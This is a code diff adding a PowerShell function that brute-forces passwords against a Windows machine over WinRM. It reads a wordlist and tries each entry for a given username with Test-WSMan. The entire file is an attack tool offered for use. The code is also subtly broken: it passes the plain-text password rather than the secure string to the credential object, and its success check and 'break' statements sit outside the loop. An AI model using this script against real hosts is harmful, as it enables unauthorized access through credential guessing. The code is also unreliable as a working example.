@@ -1,0 +1,53 @@
+function bruteforce {
+
+<#
+.SYNOPSIS
+Simple bruteforce attack upon a Windows machine running WinRM
+ #>
+
+
+[CMDLetBinding()]
+param (
+  [Parameter(mandatory=$true)] [String] $computername,
+  [Parameter(mandatory=$true)] [String] $username,
+  [Parameter(mandatory=$true)] [String] $wordlist
+  <#,
+  [String] $Authentication = "Negotiate" look into this. Maybe give the option #>
+)
+
+
+#Get the wordlist
+$passwords = Get-Content $wordlist
+
+foreach ($password in $passwords) {
+
+#clear all errors
+        $Error.clear()
+
+#make a secure string, and then a pscredentials object with username and password
+
+         $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+         $mycredential = New-Object System.Management.Automation.PSCredential ($username, $password)
+
+
+Test-WSMan -ComputerName $computername -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue | Out-Null
+
+        }
+
+
+        #put the first error into a variable (best practice)
+        $errors = $error[0]
+
+        if ($errors -eq $null) {
+               Write-Output "Password Found: $password"
+               break
+
+                } else {
+
+                Write-Output "Wrong Password: $password"
+                break
+
+                }
+               
+               
+}
